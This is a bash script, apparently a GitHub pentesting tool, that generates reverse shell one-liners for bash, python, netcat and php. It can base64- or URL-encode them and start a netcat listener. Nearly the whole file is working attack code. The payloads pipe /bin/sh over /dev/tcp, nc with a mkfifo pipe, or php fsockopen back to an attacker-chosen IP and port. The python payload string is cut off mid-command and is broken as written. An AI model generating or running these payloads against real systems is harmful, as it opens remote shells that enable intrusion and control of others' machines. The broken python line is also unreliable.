#!/bin/bash
# 
# Bash script to generate reverse shell payloads in python, php, netcat and bash | easy and fast :D
# Updates will pushed to this repo: https://github.com/bing0o/Reverse_Shell_Generator/
# This tool Required for URL Encoding: https://github.com/ffuf/pencode
#

TYPE="bash"
IP="$(ifconfig tun0 2>/dev/null | grep netmask | awk '{print $2}')"
PORT="$(shuf -i 10000-65000 -n 1)"
INTERFACE=False
RUN=False
ENCODE=False
ENCODERS=(
	base64
	url
	)



Usage(){
	while read -r line; do
		printf "%b\n" "$line"
	done <<-EOF
	\r#OPTIONS:
	\r        -t, --type           - Payload Type [python, netcat, bash, php].
	\r        -i, --ip             - Local IP.
	\r        -p, --port           - Local Port.
	\r        -r, --run            - Run Netcat Listener.
	\r        -e, --encode         - Encode The Payload [base64, url].
	\r        -I, --interface      - Get The IP From Specific Interface (Default: tun0).
	\r        -h, --help           - Prints The Help and Exit.
	\r
	EOF
	exit
}


while [ -n "$1" ]; do
	case $1 in
		-t|--type)
			TYPE="$2"
			shift ;;
		-i|--ip)
			IP="$2"
			shift ;;
		-p|--port)
			PORT="$2"
			shift ;;
		-r|--run)
			RUN=True ;;
		-e|--encode)
			ENCODE="$2"
			if [[ ! " ${ENCODERS[@]} " =~ " ${ENCODE} " ]]; then
				printf "[!] Unknown Encoder: $ENCODE\n"
				Usage
			fi
			shift ;;
		-I|--interface)
			INTERFACE="$2"
			shift ;;
		-h|--help)
			Usage ;;
		*)
			echo "[-] Unknown Option: $1"
			Usage ;;
	esac
	shift
done


Payload(){
	[ "$INTERFACE" != False ] && IP="$(ifconfig $INTERFACE 2>/dev/null | grep netmask | awk '{print $2}')"
	[ "$TYPE" == "bash" ] && PAYLOAD="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
	[ "$TYPE" == "python" ] && PAYLOAD="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));o"
	[ "$TYPE" == "netcat" ] && PAYLOAD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
	[ "$TYPE" == "php" ] && PAYLOAD="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	[[ "$ENCODE" == False ]] && echo "$PAYLOAD" || {
		[ "$ENCODE" == "base64" ] && echo "$PAYLOAD" | base64 -w 0
		[ "$ENCODE" == "url" ] && echo "$PAYLOAD" | pencode urlencode
	}
}


Payload; echo


[ "$RUN" != False ] && printf "\n[+] Starting Netcat Listener:\n" && nc -nvlp $PORT
